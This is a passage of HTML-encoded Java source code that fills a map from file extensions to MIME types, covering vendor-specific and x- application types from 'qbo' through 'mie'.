      type.put(&quot;qbo&quot;, &quot;application&#x2F;vnd.intu.qbo&quot;);
      type.put(&quot;qfx&quot;, &quot;application&#x2F;vnd.intu.qfx&quot;);
      type.put(&quot;rcprofile&quot;, &quot;application&#x2F;vnd.ipunplugged.rcprofile&quot;);
      type.put(&quot;irp&quot;, &quot;application&#x2F;vnd.irepository.package+xml&quot;);
      type.put(&quot;xpr&quot;, &quot;application&#x2F;vnd.is-xpr&quot;);
      type.put(&quot;fcs&quot;, &quot;application&#x2F;vnd.isac.fcs&quot;);
      type.put(&quot;jam&quot;, &quot;application&#x2F;vnd.jam&quot;);
      type.put(&quot;rms&quot;, &quot;application&#x2F;vnd.jcp.javame.midlet-rms&quot;);
      type.put(&quot;jisp&quot;, &quot;application&#x2F;vnd.jisp&quot;);
      type.put(&quot;joda&quot;, &quot;application&#x2F;vnd.joost.joda-archive&quot;);
      type.put(&quot;ktz&quot;, &quot;application&#x2F;vnd.kahootz&quot;);
      type.put(&quot;ktr&quot;, &quot;application&#x2F;vnd.kahootz&quot;);
      type.put(&quot;karbon&quot;, &quot;application&#x2F;vnd.kde.karbon&quot;);
      type.put(&quot;chrt&quot;, &quot;application&#x2F;vnd.kde.kchart&quot;);
      type.put(&quot;kfo&quot;, &quot;application&#x2F;vnd.kde.kformula&quot;);
      type.put(&quot;flw&quot;, &quot;application&#x2F;vnd.kde.kivio&quot;);
      type.put(&quot;kon&quot;, &quot;application&#x2F;vnd.kde.kontour&quot;);
      type.put(&quot;kpr&quot;, &quot;application&#x2F;vnd.kde.kpresenter&quot;);
      type.put(&quot;kpt&quot;, &quot;application&#x2F;vnd.kde.kpresenter&quot;);
      type.put(&quot;ksp&quot;, &quot;application&#x2F;vnd.kde.kspread&quot;);
      type.put(&quot;kwd&quot;, &quot;application&#x2F;vnd.kde.kword&quot;);
      type.put(&quot;kwt&quot;, &quot;application&#x2F;vnd.kde.kword&quot;);
      type.put(&quot;htke&quot;, &quot;application&#x2F;vnd.kenameaapp&quot;);
      type.put(&quot;kia&quot;, &quot;application&#x2F;vnd.kidspiration&quot;);
      type.put(&quot;kne&quot;, &quot;application&#x2F;vnd.kinar&quot;);
      type.put(&quot;knp&quot;, &quot;application&#x2F;vnd.kinar&quot;);
      type.put(&quot;skp&quot;, &quot;application&#x2F;vnd.koan&quot;);
      type.put(&quot;skd&quot;, &quot;application&#x2F;vnd.koan&quot;);
      type.put(&quot;skt&quot;, &quot;application&#x2F;vnd.koan&quot;);
      type.put(&quot;skm&quot;, &quot;application&#x2F;vnd.koan&quot;);
      type.put(&quot;sse&quot;, &quot;application&#x2F;vnd.kodak-descriptor&quot;);
      type.put(&quot;lasxml&quot;, &quot;application&#x2F;vnd.las.las+xml&quot;);
      type.put(&quot;lbd&quot;, &quot;application&#x2F;vnd.llamagraphics.life-balance.desktop&quot;);
      type.put(&quot;lbe&quot;, &quot;application&#x2F;vnd.llamagraphics.life-balance.exchange+xml&quot;);
      type.put(&quot;123&quot;, &quot;application&#x2F;vnd.lotus-1-2-3&quot;);
      type.put(&quot;apr&quot;, &quot;application&#x2F;vnd.lotus-approach&quot;);
      type.put(&quot;pre&quot;, &quot;application&#x2F;vnd.lotus-freelance&quot;);
      type.put(&quot;nsf&quot;, &quot;application&#x2F;vnd.lotus-notes&quot;);
      type.put(&quot;org&quot;, &quot;application&#x2F;vnd.lotus-organizer&quot;);
      type.put(&quot;scm&quot;, &quot;application&#x2F;vnd.lotus-screencam&quot;);
      type.put(&quot;lwp&quot;, &quot;application&#x2F;vnd.lotus-wordpro&quot;);
      type.put(&quot;portpkg&quot;, &quot;application&#x2F;vnd.macports.portpkg&quot;);
      type.put(&quot;mcd&quot;, &quot;application&#x2F;vnd.mcd&quot;);
      type.put(&quot;mc1&quot;, &quot;application&#x2F;vnd.medcalcdata&quot;);
      type.put(&quot;cdkey&quot;, &quot;application&#x2F;vnd.mediastation.cdkey&quot;);
      type.put(&quot;mwf&quot;, &quot;application&#x2F;vnd.mfer&quot;);
      type.put(&quot;mfm&quot;, &quot;application&#x2F;vnd.mfmp&quot;);
      type.put(&quot;flo&quot;, &quot;application&#x2F;vnd.micrografx.flo&quot;);
      type.put(&quot;igx&quot;, &quot;application&#x2F;vnd.micrografx.igx&quot;);
      type.put(&quot;mif&quot;, &quot;application&#x2F;vnd.mif&quot;);
      type.put(&quot;daf&quot;, &quot;application&#x2F;vnd.mobius.daf&quot;);
      type.put(&quot;dis&quot;, &quot;application&#x2F;vnd.mobius.dis&quot;);
      type.put(&quot;mbk&quot;, &quot;application&#x2F;vnd.mobius.mbk&quot;);
      type.put(&quot;mqy&quot;, &quot;application&#x2F;vnd.mobius.mqy&quot;);
      type.put(&quot;msl&quot;, &quot;application&#x2F;vnd.mobius.msl&quot;);
      type.put(&quot;plc&quot;, &quot;application&#x2F;vnd.mobius.plc&quot;);
      type.put(&quot;txf&quot;, &quot;application&#x2F;vnd.mobius.txf&quot;);
      type.put(&quot;mpn&quot;, &quot;application&#x2F;vnd.mophun.application&quot;);
      type.put(&quot;mpc&quot;, &quot;application&#x2F;vnd.mophun.certificate&quot;);
      type.put(&quot;xul&quot;, &quot;application&#x2F;vnd.mozilla.xul+xml&quot;);
      type.put(&quot;cil&quot;, &quot;application&#x2F;vnd.ms-artgalry&quot;);
      type.put(&quot;cab&quot;, &quot;application&#x2F;vnd.ms-cab-compressed&quot;);
      type.put(&quot;xls&quot;, &quot;application&#x2F;vnd.ms-excel&quot;);
      type.put(&quot;xlm&quot;, &quot;application&#x2F;vnd.ms-excel&quot;);
      type.put(&quot;xla&quot;, &quot;application&#x2F;vnd.ms-excel&quot;);
      type.put(&quot;xlc&quot;, &quot;application&#x2F;vnd.ms-excel&quot;);
      type.put(&quot;xlt&quot;, &quot;application&#x2F;vnd.ms-excel&quot;);
      type.put(&quot;xlw&quot;, &quot;application&#x2F;vnd.ms-excel&quot;);
      type.put(&quot;xlam&quot;, &quot;application&#x2F;vnd.ms-excel.addin.macroenabled.12&quot;);
      type.put(&quot;xlsb&quot;, &quot;application&#x2F;vnd.ms-excel.sheet.binary.macroenabled.12&quot;);
      type.put(&quot;xlsm&quot;, &quot;application&#x2F;vnd.ms-excel.sheet.macroenabled.12&quot;);
      type.put(&quot;xltm&quot;, &quot;application&#x2F;vnd.ms-excel.template.macroenabled.12&quot;);
      type.put(&quot;eot&quot;, &quot;application&#x2F;vnd.ms-fontobject&quot;);
      type.put(&quot;chm&quot;, &quot;application&#x2F;vnd.ms-htmlhelp&quot;);
      type.put(&quot;ims&quot;, &quot;application&#x2F;vnd.ms-ims&quot;);
      type.put(&quot;lrm&quot;, &quot;application&#x2F;vnd.ms-lrm&quot;);
      type.put(&quot;thmx&quot;, &quot;application&#x2F;vnd.ms-officetheme&quot;);
      type.put(&quot;cat&quot;, &quot;application&#x2F;vnd.ms-pki.seccat&quot;);
      type.put(&quot;stl&quot;, &quot;application&#x2F;vnd.ms-pki.stl&quot;);
      type.put(&quot;ppt&quot;, &quot;application&#x2F;vnd.ms-powerpoint&quot;);
      type.put(&quot;pps&quot;, &quot;application&#x2F;vnd.ms-powerpoint&quot;);
      type.put(&quot;pot&quot;, &quot;application&#x2F;vnd.ms-powerpoint&quot;);
      type.put(&quot;ppam&quot;, &quot;application&#x2F;vnd.ms-powerpoint.addin.macroenabled.12&quot;);
      type.put(&quot;pptm&quot;, &quot;application&#x2F;vnd.ms-powerpoint.presentation.macroenabled.12&quot;);
      type.put(&quot;sldm&quot;, &quot;application&#x2F;vnd.ms-powerpoint.slide.macroenabled.12&quot;);
      type.put(&quot;ppsm&quot;, &quot;application&#x2F;vnd.ms-powerpoint.slideshow.macroenabled.12&quot;);
      type.put(&quot;potm&quot;, &quot;application&#x2F;vnd.ms-powerpoint.template.macroenabled.12&quot;);
      type.put(&quot;mpp&quot;, &quot;application&#x2F;vnd.ms-project&quot;);
      type.put(&quot;mpt&quot;, &quot;application&#x2F;vnd.ms-project&quot;);
      type.put(&quot;docm&quot;, &quot;application&#x2F;vnd.ms-word.document.macroenabled.12&quot;);
      type.put(&quot;dotm&quot;, &quot;application&#x2F;vnd.ms-word.template.macroenabled.12&quot;);
      type.put(&quot;wps&quot;, &quot;application&#x2F;vnd.ms-works&quot;);
      type.put(&quot;wks&quot;, &quot;application&#x2F;vnd.ms-works&quot;);
      type.put(&quot;wcm&quot;, &quot;application&#x2F;vnd.ms-works&quot;);
      type.put(&quot;wdb&quot;, &quot;application&#x2F;vnd.ms-works&quot;);
      type.put(&quot;wpl&quot;, &quot;application&#x2F;vnd.ms-wpl&quot;);
      type.put(&quot;xps&quot;, &quot;application&#x2F;vnd.ms-xpsdocument&quot;);
      type.put(&quot;mseq&quot;, &quot;application&#x2F;vnd.mseq&quot;);
      type.put(&quot;mus&quot;, &quot;application&#x2F;vnd.musician&quot;);
      type.put(&quot;msty&quot;, &quot;application&#x2F;vnd.muvee.style&quot;);
      type.put(&quot;taglet&quot;, &quot;application&#x2F;vnd.mynfc&quot;);
      type.put(&quot;nlu&quot;, &quot;application&#x2F;vnd.neurolanguage.nlu&quot;);
      type.put(&quot;ntf&quot;, &quot;application&#x2F;vnd.nitf&quot;);
      type.put(&quot;nitf&quot;, &quot;application&#x2F;vnd.nitf&quot;);
      type.put(&quot;nnd&quot;, &quot;application&#x2F;vnd.noblenet-directory&quot;);
      type.put(&quot;nns&quot;, &quot;application&#x2F;vnd.noblenet-sealer&quot;);
      type.put(&quot;nnw&quot;, &quot;application&#x2F;vnd.noblenet-web&quot;);
      type.put(&quot;ngdat&quot;, &quot;application&#x2F;vnd.nokia.n-gage.data&quot;);
      type.put(&quot;rpst&quot;, &quot;application&#x2F;vnd.nokia.radio-preset&quot;);
      type.put(&quot;rpss&quot;, &quot;application&#x2F;vnd.nokia.radio-presets&quot;);
      type.put(&quot;edm&quot;, &quot;application&#x2F;vnd.novadigm.edm&quot;);
      type.put(&quot;edx&quot;, &quot;application&#x2F;vnd.novadigm.edx&quot;);
      type.put(&quot;ext&quot;, &quot;application&#x2F;vnd.novadigm.ext&quot;);
      type.put(&quot;odc&quot;, &quot;application&#x2F;vnd.oasis.opendocument.chart&quot;);
      type.put(&quot;otc&quot;, &quot;application&#x2F;vnd.oasis.opendocument.chart-template&quot;);
      type.put(&quot;odb&quot;, &quot;application&#x2F;vnd.oasis.opendocument.database&quot;);
      type.put(&quot;odf&quot;, &quot;application&#x2F;vnd.oasis.opendocument.formula&quot;);
      type.put(&quot;odft&quot;, &quot;application&#x2F;vnd.oasis.opendocument.formula-template&quot;);
      type.put(&quot;odg&quot;, &quot;application&#x2F;vnd.oasis.opendocument.graphics&quot;);
      type.put(&quot;otg&quot;, &quot;application&#x2F;vnd.oasis.opendocument.graphics-template&quot;);
      type.put(&quot;odi&quot;, &quot;application&#x2F;vnd.oasis.opendocument.image&quot;);
      type.put(&quot;oti&quot;, &quot;application&#x2F;vnd.oasis.opendocument.image-template&quot;);
      type.put(&quot;odp&quot;, &quot;application&#x2F;vnd.oasis.opendocument.presentation&quot;);
      type.put(&quot;otp&quot;, &quot;application&#x2F;vnd.oasis.opendocument.presentation-template&quot;);
      type.put(&quot;ods&quot;, &quot;application&#x2F;vnd.oasis.opendocument.spreadsheet&quot;);
      type.put(&quot;ots&quot;, &quot;application&#x2F;vnd.oasis.opendocument.spreadsheet-template&quot;);
      type.put(&quot;odt&quot;, &quot;application&#x2F;vnd.oasis.opendocument.text&quot;);
      type.put(&quot;odm&quot;, &quot;application&#x2F;vnd.oasis.opendocument.text-master&quot;);
      type.put(&quot;ott&quot;, &quot;application&#x2F;vnd.oasis.opendocument.text-template&quot;);
      type.put(&quot;oth&quot;, &quot;application&#x2F;vnd.oasis.opendocument.text-web&quot;);
      type.put(&quot;xo&quot;, &quot;application&#x2F;vnd.olpc-sugar&quot;);
      type.put(&quot;dd2&quot;, &quot;application&#x2F;vnd.oma.dd2+xml&quot;);
      type.put(&quot;oxt&quot;, &quot;application&#x2F;vnd.openofficeorg.extension&quot;);
      type.put(&quot;pptx&quot;, &quot;application&#x2F;vnd.openxmlformats-officedocument.presentationml.presentation&quot;);
      type.put(&quot;sldx&quot;, &quot;application&#x2F;vnd.openxmlformats-officedocument.presentationml.slide&quot;);
      type.put(&quot;ppsx&quot;, &quot;application&#x2F;vnd.openxmlformats-officedocument.presentationml.slideshow&quot;);
      type.put(&quot;potx&quot;, &quot;application&#x2F;vnd.openxmlformats-officedocument.presentationml.template&quot;);
      type.put(&quot;xlsx&quot;, &quot;application&#x2F;vnd.openxmlformats-officedocument.spreadsheetml.sheet&quot;);
      type.put(&quot;xltx&quot;, &quot;application&#x2F;vnd.openxmlformats-officedocument.spreadsheetml.template&quot;);
      type.put(&quot;docx&quot;, &quot;application&#x2F;vnd.openxmlformats-officedocument.wordprocessingml.document&quot;);
      type.put(&quot;dotx&quot;, &quot;application&#x2F;vnd.openxmlformats-officedocument.wordprocessingml.template&quot;);
      type.put(&quot;mgp&quot;, &quot;application&#x2F;vnd.osgeo.mapguide.package&quot;);
      type.put(&quot;dp&quot;, &quot;application&#x2F;vnd.osgi.dp&quot;);
      type.put(&quot;esa&quot;, &quot;application&#x2F;vnd.osgi.subsystem&quot;);
      type.put(&quot;pdb&quot;, &quot;application&#x2F;vnd.palm&quot;);
      type.put(&quot;pqa&quot;, &quot;application&#x2F;vnd.palm&quot;);
      type.put(&quot;oprc&quot;, &quot;application&#x2F;vnd.palm&quot;);
      type.put(&quot;paw&quot;, &quot;application&#x2F;vnd.pawaafile&quot;);
      type.put(&quot;str&quot;, &quot;application&#x2F;vnd.pg.format&quot;);
      type.put(&quot;ei6&quot;, &quot;application&#x2F;vnd.pg.osasli&quot;);
      type.put(&quot;efif&quot;, &quot;application&#x2F;vnd.picsel&quot;);
      type.put(&quot;wg&quot;, &quot;application&#x2F;vnd.pmi.widget&quot;);
      type.put(&quot;plf&quot;, &quot;application&#x2F;vnd.pocketlearn&quot;);
      type.put(&quot;pbd&quot;, &quot;application&#x2F;vnd.powerbuilder6&quot;);
      type.put(&quot;box&quot;, &quot;application&#x2F;vnd.previewsystems.box&quot;);
      type.put(&quot;mgz&quot;, &quot;application&#x2F;vnd.proteus.magazine&quot;);
      type.put(&quot;qps&quot;, &quot;application&#x2F;vnd.publishare-delta-tree&quot;);
      type.put(&quot;ptid&quot;, &quot;application&#x2F;vnd.pvi.ptid1&quot;);
      type.put(&quot;qxd&quot;, &quot;application&#x2F;vnd.quark.quarkxpress&quot;);
      type.put(&quot;qxt&quot;, &quot;application&#x2F;vnd.quark.quarkxpress&quot;);
      type.put(&quot;qwd&quot;, &quot;application&#x2F;vnd.quark.quarkxpress&quot;);
      type.put(&quot;qwt&quot;, &quot;application&#x2F;vnd.quark.quarkxpress&quot;);
      type.put(&quot;qxl&quot;, &quot;application&#x2F;vnd.quark.quarkxpress&quot;);
      type.put(&quot;qxb&quot;, &quot;application&#x2F;vnd.quark.quarkxpress&quot;);
      type.put(&quot;bed&quot;, &quot;application&#x2F;vnd.realvnc.bed&quot;);
      type.put(&quot;mxl&quot;, &quot;application&#x2F;vnd.recordare.musicxml&quot;);
      type.put(&quot;musicxml&quot;, &quot;application&#x2F;vnd.recordare.musicxml+xml&quot;);
      type.put(&quot;cryptonote&quot;, &quot;application&#x2F;vnd.rig.cryptonote&quot;);
      type.put(&quot;cod&quot;, &quot;application&#x2F;vnd.rim.cod&quot;);
      type.put(&quot;rm&quot;, &quot;application&#x2F;vnd.rn-realmedia&quot;);
      type.put(&quot;rmvb&quot;, &quot;application&#x2F;vnd.rn-realmedia-vbr&quot;);
      type.put(&quot;link66&quot;, &quot;application&#x2F;vnd.route66.link66+xml&quot;);
      type.put(&quot;st&quot;, &quot;application&#x2F;vnd.sailingtracker.track&quot;);
      type.put(&quot;see&quot;, &quot;application&#x2F;vnd.seemail&quot;);
      type.put(&quot;sema&quot;, &quot;application&#x2F;vnd.sema&quot;);
      type.put(&quot;semd&quot;, &quot;application&#x2F;vnd.semd&quot;);
      type.put(&quot;semf&quot;, &quot;application&#x2F;vnd.semf&quot;);
      type.put(&quot;ifm&quot;, &quot;application&#x2F;vnd.shana.informed.formdata&quot;);
      type.put(&quot;itp&quot;, &quot;application&#x2F;vnd.shana.informed.formtemplate&quot;);
      type.put(&quot;iif&quot;, &quot;application&#x2F;vnd.shana.informed.interchange&quot;);
      type.put(&quot;ipk&quot;, &quot;application&#x2F;vnd.shana.informed.package&quot;);
      type.put(&quot;twd&quot;, &quot;application&#x2F;vnd.simtech-mindmapper&quot;);
      type.put(&quot;twds&quot;, &quot;application&#x2F;vnd.simtech-mindmapper&quot;);
      type.put(&quot;mmf&quot;, &quot;application&#x2F;vnd.smaf&quot;);
      type.put(&quot;teacher&quot;, &quot;application&#x2F;vnd.smart.teacher&quot;);
      type.put(&quot;sdkm&quot;, &quot;application&#x2F;vnd.solent.sdkm+xml&quot;);
      type.put(&quot;sdkd&quot;, &quot;application&#x2F;vnd.solent.sdkm+xml&quot;);
      type.put(&quot;dxp&quot;, &quot;application&#x2F;vnd.spotfire.dxp&quot;);
      type.put(&quot;sfs&quot;, &quot;application&#x2F;vnd.spotfire.sfs&quot;);
      type.put(&quot;sdc&quot;, &quot;application&#x2F;vnd.stardivision.calc&quot;);
      type.put(&quot;sda&quot;, &quot;application&#x2F;vnd.stardivision.draw&quot;);
      type.put(&quot;sdd&quot;, &quot;application&#x2F;vnd.stardivision.impress&quot;);
      type.put(&quot;smf&quot;, &quot;application&#x2F;vnd.stardivision.math&quot;);
      type.put(&quot;sdw&quot;, &quot;application&#x2F;vnd.stardivision.writer&quot;);
      type.put(&quot;vor&quot;, &quot;application&#x2F;vnd.stardivision.writer&quot;);
      type.put(&quot;sgl&quot;, &quot;application&#x2F;vnd.stardivision.writer-global&quot;);
      type.put(&quot;smzip&quot;, &quot;application&#x2F;vnd.stepmania.package&quot;);
      type.put(&quot;sm&quot;, &quot;application&#x2F;vnd.stepmania.stepchart&quot;);
      type.put(&quot;sxc&quot;, &quot;application&#x2F;vnd.sun.xml.calc&quot;);
      type.put(&quot;stc&quot;, &quot;application&#x2F;vnd.sun.xml.calc.template&quot;);
      type.put(&quot;sxd&quot;, &quot;application&#x2F;vnd.sun.xml.draw&quot;);
      type.put(&quot;std&quot;, &quot;application&#x2F;vnd.sun.xml.draw.template&quot;);
      type.put(&quot;sxi&quot;, &quot;application&#x2F;vnd.sun.xml.impress&quot;);
      type.put(&quot;sti&quot;, &quot;application&#x2F;vnd.sun.xml.impress.template&quot;);
      type.put(&quot;sxm&quot;, &quot;application&#x2F;vnd.sun.xml.math&quot;);
      type.put(&quot;sxw&quot;, &quot;application&#x2F;vnd.sun.xml.writer&quot;);
      type.put(&quot;sxg&quot;, &quot;application&#x2F;vnd.sun.xml.writer.global&quot;);
      type.put(&quot;stw&quot;, &quot;application&#x2F;vnd.sun.xml.writer.template&quot;);
      type.put(&quot;sus&quot;, &quot;application&#x2F;vnd.sus-calendar&quot;);
      type.put(&quot;susp&quot;, &quot;application&#x2F;vnd.sus-calendar&quot;);
      type.put(&quot;svd&quot;, &quot;application&#x2F;vnd.svd&quot;);
      type.put(&quot;sis&quot;, &quot;application&#x2F;vnd.symbian.install&quot;);
      type.put(&quot;sisx&quot;, &quot;application&#x2F;vnd.symbian.install&quot;);
      type.put(&quot;xsm&quot;, &quot;application&#x2F;vnd.syncml+xml&quot;);
      type.put(&quot;bdm&quot;, &quot;application&#x2F;vnd.syncml.dm+wbxml&quot;);
      type.put(&quot;xdm&quot;, &quot;application&#x2F;vnd.syncml.dm+xml&quot;);
      type.put(&quot;tao&quot;, &quot;application&#x2F;vnd.tao.intent-module-archive&quot;);
      type.put(&quot;pcap&quot;, &quot;application&#x2F;vnd.tcpdump.pcap&quot;);
      type.put(&quot;cap&quot;, &quot;application&#x2F;vnd.tcpdump.pcap&quot;);
      type.put(&quot;dmp&quot;, &quot;application&#x2F;vnd.tcpdump.pcap&quot;);
      type.put(&quot;tmo&quot;, &quot;application&#x2F;vnd.tmobile-livetv&quot;);
      type.put(&quot;tpt&quot;, &quot;application&#x2F;vnd.trid.tpt&quot;);
      type.put(&quot;mxs&quot;, &quot;application&#x2F;vnd.triscape.mxs&quot;);
      type.put(&quot;tra&quot;, &quot;application&#x2F;vnd.trueapp&quot;);
      type.put(&quot;ufd&quot;, &quot;application&#x2F;vnd.ufdl&quot;);
      type.put(&quot;ufdl&quot;, &quot;application&#x2F;vnd.ufdl&quot;);
      type.put(&quot;utz&quot;, &quot;application&#x2F;vnd.uiq.theme&quot;);
      type.put(&quot;umj&quot;, &quot;application&#x2F;vnd.umajin&quot;);
      type.put(&quot;unityweb&quot;, &quot;application&#x2F;vnd.unity&quot;);
      type.put(&quot;uoml&quot;, &quot;application&#x2F;vnd.uoml+xml&quot;);
      type.put(&quot;vcx&quot;, &quot;application&#x2F;vnd.vcx&quot;);
      type.put(&quot;vsd&quot;, &quot;application&#x2F;vnd.visio&quot;);
      type.put(&quot;vst&quot;, &quot;application&#x2F;vnd.visio&quot;);
      type.put(&quot;vss&quot;, &quot;application&#x2F;vnd.visio&quot;);
      type.put(&quot;vsw&quot;, &quot;application&#x2F;vnd.visio&quot;);
      type.put(&quot;vis&quot;, &quot;application&#x2F;vnd.visionary&quot;);
      type.put(&quot;vsf&quot;, &quot;application&#x2F;vnd.vsf&quot;);
      type.put(&quot;wbxml&quot;, &quot;application&#x2F;vnd.wap.wbxml&quot;);
      type.put(&quot;wmlc&quot;, &quot;application&#x2F;vnd.wap.wmlc&quot;);
      type.put(&quot;wmlsc&quot;, &quot;application&#x2F;vnd.wap.wmlscriptc&quot;);
      type.put(&quot;wtb&quot;, &quot;application&#x2F;vnd.webturbo&quot;);
      type.put(&quot;nbp&quot;, &quot;application&#x2F;vnd.wolfram.player&quot;);
      type.put(&quot;wpd&quot;, &quot;application&#x2F;vnd.wordperfect&quot;);
      type.put(&quot;wqd&quot;, &quot;application&#x2F;vnd.wqd&quot;);
      type.put(&quot;stf&quot;, &quot;application&#x2F;vnd.wt.stf&quot;);
      type.put(&quot;xar&quot;, &quot;application&#x2F;vnd.xara&quot;);
      type.put(&quot;xfdl&quot;, &quot;application&#x2F;vnd.xfdl&quot;);
      type.put(&quot;hvd&quot;, &quot;application&#x2F;vnd.yamaha.hv-dic&quot;);
      type.put(&quot;hvs&quot;, &quot;application&#x2F;vnd.yamaha.hv-script&quot;);
      type.put(&quot;hvp&quot;, &quot;application&#x2F;vnd.yamaha.hv-voice&quot;);
      type.put(&quot;osf&quot;, &quot;application&#x2F;vnd.yamaha.openscoreformat&quot;);
      type.put(&quot;osfpvg&quot;, &quot;application&#x2F;vnd.yamaha.openscoreformat.osfpvg+xml&quot;);
      type.put(&quot;saf&quot;, &quot;application&#x2F;vnd.yamaha.smaf-audio&quot;);
      type.put(&quot;spf&quot;, &quot;application&#x2F;vnd.yamaha.smaf-phrase&quot;);
      type.put(&quot;cmp&quot;, &quot;application&#x2F;vnd.yellowriver-custom-menu&quot;);
      type.put(&quot;zir&quot;, &quot;application&#x2F;vnd.zul&quot;);
      type.put(&quot;zirz&quot;, &quot;application&#x2F;vnd.zul&quot;);
      type.put(&quot;zaz&quot;, &quot;application&#x2F;vnd.zzazz.deck+xml&quot;);
      type.put(&quot;vxml&quot;, &quot;application&#x2F;voicexml+xml&quot;);
      type.put(&quot;wgt&quot;, &quot;application&#x2F;widget&quot;);
      type.put(&quot;hlp&quot;, &quot;application&#x2F;winhlp&quot;);
      type.put(&quot;wsdl&quot;, &quot;application&#x2F;wsdl+xml&quot;);
      type.put(&quot;wspolicy&quot;, &quot;application&#x2F;wspolicy+xml&quot;);
      type.put(&quot;7z&quot;, &quot;application&#x2F;x-7z-compressed&quot;);
      type.put(&quot;abw&quot;, &quot;application&#x2F;x-abiword&quot;);
      type.put(&quot;ace&quot;, &quot;application&#x2F;x-ace-compressed&quot;);
      type.put(&quot;dmg&quot;, &quot;application&#x2F;x-apple-diskimage&quot;);
      type.put(&quot;aab&quot;, &quot;application&#x2F;x-authorware-bin&quot;);
      type.put(&quot;x32&quot;, &quot;application&#x2F;x-authorware-bin&quot;);
      type.put(&quot;u32&quot;, &quot;application&#x2F;x-authorware-bin&quot;);
      type.put(&quot;vox&quot;, &quot;application&#x2F;x-authorware-bin&quot;);
      type.put(&quot;aam&quot;, &quot;application&#x2F;x-authorware-map&quot;);
      type.put(&quot;aas&quot;, &quot;application&#x2F;x-authorware-seg&quot;);
      type.put(&quot;bcpio&quot;, &quot;application&#x2F;x-bcpio&quot;);
      type.put(&quot;torrent&quot;, &quot;application&#x2F;x-bittorrent&quot;);
      type.put(&quot;blb&quot;, &quot;application&#x2F;x-blorb&quot;);
      type.put(&quot;blorb&quot;, &quot;application&#x2F;x-blorb&quot;);
      type.put(&quot;bz&quot;, &quot;application&#x2F;x-bzip&quot;);
      type.put(&quot;bz2&quot;, &quot;application&#x2F;x-bzip2&quot;);
      type.put(&quot;boz&quot;, &quot;application&#x2F;x-bzip2&quot;);
      type.put(&quot;cbr&quot;, &quot;application&#x2F;x-cbr&quot;);
      type.put(&quot;cba&quot;, &quot;application&#x2F;x-cbr&quot;);
      type.put(&quot;cbt&quot;, &quot;application&#x2F;x-cbr&quot;);
      type.put(&quot;cbz&quot;, &quot;application&#x2F;x-cbr&quot;);
      type.put(&quot;cb7&quot;, &quot;application&#x2F;x-cbr&quot;);
      type.put(&quot;vcd&quot;, &quot;application&#x2F;x-cdlink&quot;);
      type.put(&quot;cfs&quot;, &quot;application&#x2F;x-cfs-compressed&quot;);
      type.put(&quot;chat&quot;, &quot;application&#x2F;x-chat&quot;);
      type.put(&quot;pgn&quot;, &quot;application&#x2F;x-chess-pgn&quot;);
      type.put(&quot;crx&quot;, &quot;application&#x2F;x-chrome-extension&quot;);
      type.put(&quot;nsc&quot;, &quot;application&#x2F;x-conference&quot;);
      type.put(&quot;cpio&quot;, &quot;application&#x2F;x-cpio&quot;);
      type.put(&quot;csh&quot;, &quot;application&#x2F;x-csh&quot;);
      type.put(&quot;deb&quot;, &quot;application&#x2F;x-debian-package&quot;);
      type.put(&quot;udeb&quot;, &quot;application&#x2F;x-debian-package&quot;);
      type.put(&quot;dgc&quot;, &quot;application&#x2F;x-dgc-compressed&quot;);
      type.put(&quot;dir&quot;, &quot;application&#x2F;x-director&quot;);
      type.put(&quot;dcr&quot;, &quot;application&#x2F;x-director&quot;);
      type.put(&quot;dxr&quot;, &quot;application&#x2F;x-director&quot;);
      type.put(&quot;cst&quot;, &quot;application&#x2F;x-director&quot;);
      type.put(&quot;cct&quot;, &quot;application&#x2F;x-director&quot;);
      type.put(&quot;cxt&quot;, &quot;application&#x2F;x-director&quot;);
      type.put(&quot;w3d&quot;, &quot;application&#x2F;x-director&quot;);
      type.put(&quot;fgd&quot;, &quot;application&#x2F;x-director&quot;);
      type.put(&quot;swa&quot;, &quot;application&#x2F;x-director&quot;);
      type.put(&quot;wad&quot;, &quot;application&#x2F;x-doom&quot;);
      type.put(&quot;ncx&quot;, &quot;application&#x2F;x-dtbncx+xml&quot;);
      type.put(&quot;dtb&quot;, &quot;application&#x2F;x-dtbook+xml&quot;);
      type.put(&quot;res&quot;, &quot;application&#x2F;x-dtbresource+xml&quot;);
      type.put(&quot;dvi&quot;, &quot;application&#x2F;x-dvi&quot;);
      type.put(&quot;evy&quot;, &quot;application&#x2F;x-envoy&quot;);
      type.put(&quot;eva&quot;, &quot;application&#x2F;x-eva&quot;);
      type.put(&quot;bdf&quot;, &quot;application&#x2F;x-font-bdf&quot;);
      type.put(&quot;gsf&quot;, &quot;application&#x2F;x-font-ghostscript&quot;);
      type.put(&quot;psf&quot;, &quot;application&#x2F;x-font-linux-psf&quot;);
      type.put(&quot;otf&quot;, &quot;application&#x2F;x-font-otf&quot;);
      type.put(&quot;pcf&quot;, &quot;application&#x2F;x-font-pcf&quot;);
      type.put(&quot;snf&quot;, &quot;application&#x2F;x-font-snf&quot;);
      type.put(&quot;ttf&quot;, &quot;application&#x2F;x-font-ttf&quot;);
      type.put(&quot;ttc&quot;, &quot;application&#x2F;x-font-ttf&quot;);
      type.put(&quot;pfa&quot;, &quot;application&#x2F;x-font-type1&quot;);
      type.put(&quot;pfb&quot;, &quot;application&#x2F;x-font-type1&quot;);
      type.put(&quot;pfm&quot;, &quot;application&#x2F;x-font-type1&quot;);
      type.put(&quot;afm&quot;, &quot;application&#x2F;x-font-type1&quot;);
      type.put(&quot;arc&quot;, &quot;application&#x2F;x-freearc&quot;);
      type.put(&quot;spl&quot;, &quot;application&#x2F;x-futuresplash&quot;);
      type.put(&quot;gca&quot;, &quot;application&#x2F;x-gca-compressed&quot;);
      type.put(&quot;ulx&quot;, &quot;application&#x2F;x-glulx&quot;);
      type.put(&quot;gnumeric&quot;, &quot;application&#x2F;x-gnumeric&quot;);
      type.put(&quot;gramps&quot;, &quot;application&#x2F;x-gramps-xml&quot;);
      type.put(&quot;gtar&quot;, &quot;application&#x2F;x-gtar&quot;);
      type.put(&quot;hdf&quot;, &quot;application&#x2F;x-hdf&quot;);
      type.put(&quot;install&quot;, &quot;application&#x2F;x-install-instructions&quot;);
      type.put(&quot;iso&quot;, &quot;application&#x2F;x-iso9660-image&quot;);
      type.put(&quot;jnlp&quot;, &quot;application&#x2F;x-java-jnlp-file&quot;);
      type.put(&quot;latex&quot;, &quot;application&#x2F;x-latex&quot;);
      type.put(&quot;luac&quot;, &quot;application&#x2F;x-lua-bytecode&quot;);
      type.put(&quot;lzh&quot;, &quot;application&#x2F;x-lzh-compressed&quot;);
      type.put(&quot;lha&quot;, &quot;application&#x2F;x-lzh-compressed&quot;);
      type.put(&quot;mie&quot;, &quot;application&#x2F;x-mie&quot;);
